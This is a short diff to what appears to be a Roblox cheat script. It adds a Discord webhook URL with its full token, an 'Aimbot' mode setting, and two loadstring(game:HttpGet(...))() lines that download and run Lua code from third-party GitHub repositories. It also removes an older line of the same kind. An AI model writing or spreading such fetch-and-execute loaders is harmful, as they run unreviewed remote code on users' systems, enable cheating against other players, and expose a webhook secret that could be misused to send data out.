@@ -1,6 +1,4 @@
-loadstring(game:HttpGet https://raw.githubusercontent.co m/natoppo044/modzcaster/main/Ful.lua") ()
-
-
-
-
-
+_G.webhooksdiscord = "https://discord.com/api/webhooks/1054735612122501140/OFrfrbVnvi4Xi6NhUKtH5Ok1PFBXfle553VzBvUjROj196cb_2Sh9PCgrL4LKoxKjB74"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+_G.Mode = "Aimbot" -- Aimbot / Normal
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xlostpexz/tyuiop/Fps/Loading.lua"))()
